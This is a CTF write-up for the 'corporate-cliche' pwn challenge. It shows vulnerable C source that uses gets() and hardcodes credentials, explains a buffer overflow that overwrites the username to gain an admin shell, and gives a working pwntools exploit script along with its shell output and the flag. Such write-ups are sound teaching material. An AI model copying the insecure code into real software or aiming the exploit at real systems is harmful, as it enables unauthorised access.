---
layout: writeup
title: corporate-cliche
tags: Pwn
---

## Description

Dear Raahguu,

It's time to really push the envelope and go above and beyond! We've got a new challenge for you. Can you find a way to get into our email server?

Regards,
Blue Alder

The description then provided the source code and binary, along with an `nc` command to remotely connect to the binary that had the actual flag


## Solution

The source code written in `c` was:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void open_admin_session() {
    printf("-> Admin login successful. Opening shell...\n");
    system("/bin/sh");
    exit(0);
}

void print_email() {
    printf(" ______________________________________________________________________\n");
    printf("| To:      all-staff@downunderctf.com                                  |\n");
    printf("| From:    synergy-master@downunderctf.com                             |\n");
    printf("| Subject: Action Item: Leveraging Synergies                           |\n");
    printf("|______________________________________________________________________|\n");
    printf("|                                                                      |\n");
    printf("| Per my last communication, I'm just circling back to action the      |\n");
    printf("| sending of this email to leverage our synergies. Let's touch base    |\n");
    printf("| offline to drill down on the key takeaways and ensure we are all     |\n");
    printf("| aligned on this new paradigm. Moving forward, we need to think       |\n");
    printf("| outside the box to optimize our workflow and get the ball rolling.   |\n");
    printf("|                                                                      |\n");
    printf("| Best,                                                                |\n");
    printf("| A. Manager                                                           |\n");
    printf("|______________________________________________________________________|\n");
    exit(0);
}

const char* logins[][2] = {
    {"admin", "🇦🇩🇲🇮🇳"},
    {"guest", "guest"},
};

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    char password[32];
    char username[32];

    printf("┌──────────────────────────────────────┐\n");
    printf("│      Secure Email System v1.337      │\n");
    printf("└──────────────────────────────────────┘\n\n");

    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "admin") == 0) {
        printf("-> Admin login is disabled. Access denied.\n");
        exit(0);
    }

    printf("Enter your password: ");
    gets(password);

    for (int i = 0; i < sizeof(logins) / sizeof(logins[0]); i++) {
        if (strcmp(username, logins[i][0]) == 0) {
            if (strcmp(password, logins[i][1]) == 0) {
                printf("-> Password correct. Access granted.\n");
                if (strcmp(username, "admin") == 0) {
                    open_admin_session();
                } else {
                    print_email();
                }
            } else {
                printf("-> Incorrect password for user '%s'. Access denied.\n", username);
                exit(1);
            }
        }
    }
    printf("-> Login failed. User '%s' not recognized.\n", username);
    exit(1);
}

```

This code reveals a program where you are prompted for a username, and password. Then if your username and password meet the hardcoded admin credentials, you get remote access to the machine.

The trick with this program though, is that if you enter the username `admin` you get kicked out from the connection, and so cannot just login normally.

The key to this challenge is that the `password` buffer is stored right before the `username` buffer in memory, and the input for the password uses `gets`

`gets` is a depricated way to get user input as it does not have a way to restrict the user's input length, and therefore is liable to have the user do buffer overflow within it, in this case buffer overflow from `password` would go into `username`

So If we enter a username, say `Raahguu` then that username will pass the is `username` `admin` check, and then by inputting a password that overflows its buffer into username, we can overwrite the olf username value of `e` with a new value `admin`

Then if the username is `admin` and the password is `🇦🇩🇲🇮🇳` then we log in as admin and get remote shell to read the flag.

To execute this buffer overflow, we just need to input the password `🇦🇩🇲🇮🇳` which is already 20 bytes long due to the 5 4-byte long characters. As the `password` buffer is `32` bytes long, and we already input `20` we just need to input `12` more bytes. 

Now as the password needs to remain the same, we need to tell the program that our string ends after the 20th byte, which we can do by inputing a null bytes `\x00` and then we just need to input `11` more bytes. Afterwards, we are writing into the `username` buffer and need to pass in `admin` and then another null byte `\x00` to tell the program the username ends there.

Now instead of inputting that all myself, I wrote a python program to do it for me:

```python
# Import Pwn Tools
from pwn import *

# nc values
host = "chal.2025.ductf.net"
port = 30000

# Connect to the remote service
conn = remote(host, port)

# Send username
conn.sendline(b"Raahguu")

# Buffer overflow: actual password + 12 null bytes + "admin" + null byte
password = "🇦🇩🇲🇮🇳".encode("utf-8") + b"\x00"*12 + b"admin" + b"\x00"
conn.sendline(password)

# Give me interactive control
conn.interactive()
```

Running this automates the username and password process, and then gives me control of the nc session once we have a remote shell. Running it gets the following output.

```shell
$ python solver.py
[+] Opening connection to chal.2025.ductf.net on port 30000: Done
[*] Switching to interactive mode
┌──────────────────────────────────────┐
│      Secure Email System v1.337      │
└──────────────────────────────────────┘

Enter your username: Enter your password: -> Password correct. Access granted.
-> Admin login successful. Opening shell...
$ ls
flag.txt
get-flag
pwn
$ cat flag.txt
DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}
```

And there's the flag `DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}`
